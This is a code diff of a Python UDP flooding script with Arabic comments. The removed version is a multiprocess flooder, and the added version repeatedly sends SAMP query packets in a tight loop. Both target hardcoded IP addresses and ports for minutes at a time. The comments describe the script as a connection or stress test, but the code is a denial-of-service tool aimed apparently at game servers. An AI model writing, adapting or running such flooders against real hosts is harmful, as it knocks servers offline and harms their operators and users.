@@ -1,41 +1,32 @@
 import socket
 import time
-from multiprocessing import Process, cpu_count
 
-# ==========================================
-# إعدادات الهدف والأداء
-# ==========================================
-TARGET_IP = "193.233.114.200"
-TARGET_PORT = 19134
-DURATION = 180  # مدة التشغيل بالثواني
+# حدد البيانات
+TARGET_IP = "89.46.1.130"  # استبدله بـ IP الهدف
+TARGET_PORT = 7000        # استبدله بمنفذ السيرفر
+DURATION = 300              # مدة الاختبار بالثواني
 
-def udp_stress_worker(ip, port, duration):
-    end_time = time.time() + duration
-    payload = b"\x01\x00\x00\x00\x00\x00\x00\x00" * 8
+def test_connection():
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # حزمة استعلام SAMP بسيطة (Info Query)
+    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:900] + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
+    
+    end_time = time.time() + DURATION
+    count = 0
+    
+    print(f"جاري اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT}...")
     
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while time.time() < end_time:
-            for _ in range(20):
-                sock.sendto(payload, (ip, port))
-        sock.close()
-    except Exception:
-        pass
+            client.sendto(payload, (TARGET_IP, TARGET_PORT))
+            count += 1
+    except Exception as e:
+        print(f"حدث خطأ: {e}")
+    finally:
+        client.close()
+        print(f"تم إرسال {count} حزمة استعلام.")
 
-def main():
-    workers = max(2, cpu_count())
-    print(f"[*] بدء التشغيل بـ {workers} عمليات متوازية...")
+if __name__ == "__main__":
+    test_connection()
     
-    processes = []
-    for _ in range(workers):
-        p = Process(target=udp_stress_worker, args=(TARGET_IP, TARGET_PORT, DURATION))
-        processes.append(p)
-        p.start()
-        
-    for p in processes:
-        p.join()
-        
-    print("[*] انتهى الاختبار بنجاح.")
-
-if __name__ == '__main__':
-    main()
